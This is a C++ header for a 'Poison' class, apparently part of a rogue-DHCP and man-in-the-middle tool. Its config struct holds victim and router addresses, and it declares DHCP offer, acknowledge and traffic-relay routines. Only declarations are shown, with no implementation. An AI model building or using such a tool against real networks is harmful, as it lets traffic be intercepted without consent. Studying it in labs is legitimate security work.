#pragma once

// Standard headers
#include <cstdint> // fixed-size integer types
#include <string>  // std::string

// Networking (POSIX / sockets)
#include <arpa/inet.h>  // inet_pton, inet_ntoa
#include <netinet/in.h> // sockaddr_in, IPPROTO_*
#include <sys/ioctl.h>  // ioctl
#include <sys/socket.h> // socket, bind, recvfrom, sendto
#include <sys/types.h>  // system data types
#include <thread>       // thread
#include <unistd.h>     // close

// Linux-specific (raw sockets, interfaces)
#include <linux/if_ether.h>  // ETH_P_ALL
#include <linux/if_packet.h> // sockaddr_ll
#include <linux/sockios.h>   // SIOCGIFINDEX
#include <net/if.h>          // struct ifreq
#include <netinet/ip.h>      // iphdr
#include <netinet/tcp.h>     // tcp
#include <netinet/udp.h>     // udphdr
#include "logger.hpp"
#include "parser.hpp"



using namespace std;
#define PARSE_IP(ipStr)                                                        \
  ([&]() {                                                                     \
    struct in_addr addr;                                                       \
    if (inet_pton(AF_INET, (ipStr).c_str(), &addr) != 1) {                     \
      return (uint32_t)0;                                                      \
    }                                                                          \
    return (uint32_t)addr.s_addr;                                              \
  }())


struct config {
  string interface;        // interface name wlan0,eth0
  uint8_t interfaceMac[6]; // interface mac address

  // victim info
  uint8_t targetMac[6];  // target mac address;
  uint8_t routerMac[6];  // real router mac address (help for MITM)
  uint32_t targetIp;     // IP of the target to poison
  uint32_t realRouterIp; // Real router IP (help for MITM)s

  // dhcp setting
  uint32_t subnet;      // subnet mask, 255.255.255.0
  uint32_t broadcast;   // broadcast address, 192.168.1.255
  uint32_t gateway;     // gateway address, 192.168.1.1
  vector<uint32_t> dns; // DNS IPs
  uint32_t ipToGive;    // IP address to give to client

  string domainName; // Domain name to give to client
  string hostName;   // Host name to give to client

  config(const string &iface, const uint8_t *targetMac,
         const uint8_t *routerMac, const string &targetIp,
         const string &realRouterIp, const string &subnet,
         const string &broadcast, const string &gateway,
         const vector<string> &dns, const string &ipToGive,
         const string &domainName, const string &hostName) {
    this->interface = iface;

    memcpy(this->targetMac, targetMac, sizeof(uint8_t) * 6);
    memcpy(this->routerMac, routerMac, sizeof(uint8_t) * 6);
    this->targetIp = PARSE_IP(targetIp);
    this->realRouterIp = PARSE_IP(realRouterIp);
    this->subnet = PARSE_IP(subnet);
    this->broadcast = PARSE_IP(broadcast);
    this->gateway = PARSE_IP(gateway);
    for (auto &i : dns) {
      this->dns.push_back(PARSE_IP(i));
    }
    this->ipToGive = PARSE_IP(ipToGive);
    this->domainName = domainName;
    this->hostName = hostName;
  };
};
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68
#define MTU 1500

class Poison {
  bool running{false};
  int sockfd;
  int relayfd;


  struct sockaddr_ll serverAddr{0};
  config cfg;

  thread relayTrafficThread;
  thread poisoningThread;
  uint16_t checksumTCP(uint32_t src_ip, uint32_t dest_ip, uint8_t *tcp_data,
                       uint16_t tcp_length);
  uint16_t checksumUDP(uint32_t src_ip, uint32_t dest_ip, uint8_t *udp_data,
                       uint16_t udp_length);
  uint16_t checksumIp(const uint8_t *buffer, uint8_t ihl);

  void buildEther(uint8_t *buffer, const uint8_t *src, const uint8_t *dst,
                  const uint16_t type);
  void buildIp(uint8_t *buffer, uint32_t src, uint32_t dest, uint16_t total,
               uint8_t protocol);
  void buildUDP(uint8_t *buffer, uint32_t srcip, uint32_t dstip, uint16_t src,
                uint16_t dst, uint16_t length);

  size_t offer(const DHCPPacket &pkt, uint8_t *buffer, size_t len);
  size_t acknowledge(const DHCPPacket &pkt, uint8_t *buffer, size_t len);
  void relayTraffic();
  void poisoning();

public:
  Poison(const config &conf) : cfg(conf) {}
  bool handleClientRequest(const DHCPPacket &packet);

  ~Poison();
  void start();
  void stop();
};
